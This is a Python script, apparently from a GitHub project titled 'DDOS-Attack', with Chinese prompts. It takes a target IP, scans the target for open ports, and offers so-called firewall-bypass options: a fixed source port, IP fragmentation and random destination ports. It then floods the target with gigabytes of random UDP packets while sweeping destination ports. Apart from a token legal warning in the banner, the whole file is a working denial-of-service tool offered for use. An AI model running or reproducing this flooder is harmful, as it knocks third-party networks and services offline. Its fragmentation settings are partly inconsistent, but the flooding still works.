import sys
import os
import time
import socket
import ipaddress
import random

# ==================== 启动艺术字与法律警告 ====================

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("严重警告")
print("你已经触碰到了法律底线和道德边界，请立即退出，或等待3秒")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(2)

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author  : BCU-0")
print("GitHub  : https://github.com/BC-809/DDOS-Attack.git")
print("")

# ==================== 参数输入与验证 ====================

# 目标 IP 验证
while True:
    try:
        ip_str = input("[?] 目标 IP 地址: ").strip()
        ipaddress.ip_address(ip_str)
        target_ip = ip_str
        break
    except ValueError:
        print("[!] 无效的 IP 地址，请重新输入。")

# 目标端口验证
user_provided_port = False
target_port = None
while True:
    try:
        port_str = input("[?] 目标端口 (直接回车则自动探测): ").strip()
        if port_str == "":
            target_port = None
            break
        port = int(port_str)
        if 1 <= port <= 65535:
            target_port = port
            user_provided_port = True
            break
        else:
            print("[!] 端口必须在 1 到 65535 之间。")
    except ValueError:
        print("[!] 无效的端口号，请输入数字，或直接回车自动探测。")

# 总流量输入（单位 GB）
while True:
    try:
        gb_str = input("[?] 发送总流量 (GB): ").strip()
        total_gb = float(gb_str)
        if total_gb <= 0:
            print("[!] 流量必须大于 0 GB。")
            continue
        break
    except ValueError:
        print("[!] 无效的数值，请输入数字。")

# 可选速率限制（发包间隔）
rate_limit = 0.0
try:
    rate_str = input("[?] 发包间隔（秒，0 表示不限速，例如 0.1）: ").strip()
    rate_limit = float(rate_str)
except ValueError:
    rate_limit = 0.0

# ---------- 防火墙绕过选项 ----------
print("\n--- 防火墙绕过选项 (仅供实验) ---")
src = input("[?] 指定源端口 (留空则系统随机分配): ").strip()
source_port = int(src) if src else None

frag = input("[?] 启用 IP 分片? (y/N): ").strip().lower()
use_fragmentation = (frag == 'y')

rnd = input("[?] 使用随机目标端口? (y/N): ").strip().lower()
random_target_port = (rnd == 'y')

# 根据分片设置载荷大小（初始值）
if use_fragmentation:
    PACKET_SIZE = 3000
else:
    PACKET_SIZE = 1490

total_bytes = int(total_gb * 1024 * 1024 * 1024)
max_packets = total_bytes // PACKET_SIZE
print(f"\n[*] 将发送 {max_packets} 个数据包，总计 {total_gb:.2f} GB。")
if rate_limit > 0:
    print(f"[*] 发包间隔: {rate_limit} 秒")
if source_port is not None:
    print(f"[*] 源端口: {source_port}")
if use_fragmentation:
    print(f"[*] IP 分片已启用，单包载荷 {PACKET_SIZE} 字节")
if random_target_port:
    print("[*] 随机目标端口模式已启用")

# ==================== 端口探测函数（支持大量扫描，实时输出端口） ====================

def check_target(ip, port):
    """简单 TCP 连接测试，返回 True/False"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def discover_open_port(ip, port_range):
    """扫描端口范围，返回第一个开放的端口号，同时显示正在探测的端口"""
    print(f"[*] 正在扫描端口 {min(port_range)}-{max(port_range)}，请耐心等待...")
    try:
        for p in port_range:
            print(f"[>] 正在探测端口: {p}")
            if check_target(ip, p):
                return p
    except KeyboardInterrupt:
        print("\n[!] 扫描被用户中断。")
        return None
    return None

# ==================== 确定最终攻击端口 ====================

if target_port is not None and user_provided_port:
    print(f"[*] 正在检查端口 {target_port} 的连通性...")
    if check_target(target_ip, target_port):
        final_port = target_port
        print(f"[+] 端口 {final_port} 可达，将直接使用。")
    else:
        print(f"[!] 端口 {target_port} 不可达。")
        scan_choice = input("[?] 是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
        if scan_choice == 'y':
            print("\n请选择扫描模式：")
            print("1. 快速扫描 (常用端口)")
            print("2. 全端口扫描 (1-65535，耗时较长)")
            print("3. 自定义范围")
            mode = input("[?] 请输入选项 (1/2/3): ").strip()
            if mode == '1':
                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
            elif mode == '2':
                ports = range(1, 65536)
            elif mode == '3':
                try:
                    start_port = int(input("[?] 起始端口: "))
                    end_port = int(input("[?] 结束端口: "))
                    if start_port < 1 or end_port > 65535 or start_port > end_port:
                        print("[!] 端口范围无效，将使用快速扫描。")
                        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
                    else:
                        ports = range(start_port, end_port + 1)
                except ValueError:
                    print("[!] 输入无效，将使用快速扫描。")
                    ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
            else:
                print("[!] 选项无效，将使用快速扫描。")
                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]

            alt_port = discover_open_port(target_ip, ports)
            if alt_port is not None:
                print(f"[+] 已找到开放端口: {alt_port}")
                final_port = alt_port
            else:
                print("[!] 未发现任何开放端口。")
                while True:
                    force_choice = input("[?] 是否使用原端口强制发送？(y/n): ").strip().lower()
                    if force_choice == 'y':
                        final_port = target_port
                        print(f"[*] 将使用原端口 {final_port} 强制发送。")
                        break
                    elif force_choice == 'n':
                        print("[*] 用户取消攻击。")
                        sys.exit(0)
                    else:
                        print("[!] 请输入 y 或 n。")
        else:
            while True:
                force_choice = input("[?] 是否使用原端口强制发送？(y/n): ").strip().lower()
                if force_choice == 'y':
                    final_port = target_port
                    print(f"[*] 将使用原端口 {final_port} 强制发送。")
                    break
                elif force_choice == 'n':
                    print("[*] 用户取消攻击。")
                    sys.exit(0)
                else:
                    print("[!] 请输入 y 或 n。")
else:
    print("[*] 用户未指定端口，启动端口扫描...")
    print("请选择扫描模式：")
    print("1. 快速扫描 (常用端口)")
    print("2. 全端口扫描 (1-65535，耗时较长)")
    print("3. 自定义范围")
    mode = input("[?] 请输入选项 (1/2/3): ").strip()
    if mode == '1':
        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
    elif mode == '2':
        ports = range(1, 65536)
    elif mode == '3':
        try:
            start_port = int(input("[?] 起始端口: "))
            end_port = int(input("[?] 结束端口: "))
            if start_port < 1 or end_port > 65535 or start_port > end_port:
                print("[!] 端口范围无效，将使用快速扫描。")
                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
            else:
                ports = range(start_port, end_port + 1)
        except ValueError:
            print("[!] 输入无效，将使用快速扫描。")
            ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
    else:
        print("[!] 选项无效，将使用快速扫描。")
        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]

    final_port = discover_open_port(target_ip, ports)
    if final_port is None:
        print("[!] 未探测到任何开放端口，且用户未指定端口，攻击无法继续。")
        sys.exit(1)
    print(f"[+] 探测成功，将使用开放端口: {final_port}")

# ==================== 显示攻击启动画面 ====================

os.system("clear")
os.system("figlet Attack Starting")

# ==================== 最终确认（移至 figlet 下方） ====================

print(f"\n[*] 攻击将使用目标端口: {final_port}")
while True:
    confirm = input("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。请确认 (yes/no): ").strip().lower()
    if confirm == 'yes':
        break
    elif confirm == 'no':
        print("[*] 用户取消。")
        sys.exit(0)
    else:
        print("[!] 请输入 yes 或 no。")

# ==================== 攻击发送循环 ====================

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if source_port is not None:
    try:
        sock.bind(('', source_port))
    except OSError as e:
        print(f"[!] 无法绑定源端口 {source_port}: {e}")
        sock.close()
        sys.exit(1)

frag_enabled = False
if use_fragmentation:
    try:
        if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
            frag_enabled = True
        else:
            raise AttributeError("IP_MTU_DISCOVER not available")
    except (AttributeError, OSError) as e:
        print(f"[!] 无法启用 IP 分片 ({e})，将使用普通发送模式（载荷 1490 字节）。")
        PACKET_SIZE = 1490
        total_bytes = int(total_gb * 1024 * 1024 * 1024)
        max_packets = total_bytes // PACKET_SIZE
        print(f"[*] 调整后总包数: {max_packets}")

payload = os.urandom(PACKET_SIZE)

sent = 0
sent_bytes = 0
next_mb_threshold = 1024 * 1024
start_time = time.time()

try:
    while sent < max_packets:
        if random_target_port:
            current_port = random.randint(1, 65535)
        else:
            current_port = final_port

        sock.sendto(payload, (target_ip, current_port))
        sent += 1
        sent_bytes += PACKET_SIZE

        if not random_target_port:
            final_port += 1
            if final_port > 65534:
                final_port = 1

        if sent_bytes >= next_mb_threshold:
            gb_sent = sent_bytes / (1024 * 1024 * 1024)
            elapsed = time.time() - start_time
            pps = sent / elapsed if elapsed > 0 else 0
            print(f"[>] 已发送: {sent} 包 ({gb_sent:.4f} GB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
            next_mb_threshold += 1024 * 1024

        if rate_limit > 0:
            time.sleep(rate_limit)

except KeyboardInterrupt:
    print("\n[!] 用户手动停止发送。")
except Exception as e:
    print(f"\n[!] 错误: {e}")
finally:
    sock.close()
    elapsed = time.time() - start_time
    print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024*1024):.4f} GB, 用时: {elapsed:.2f} 秒。")
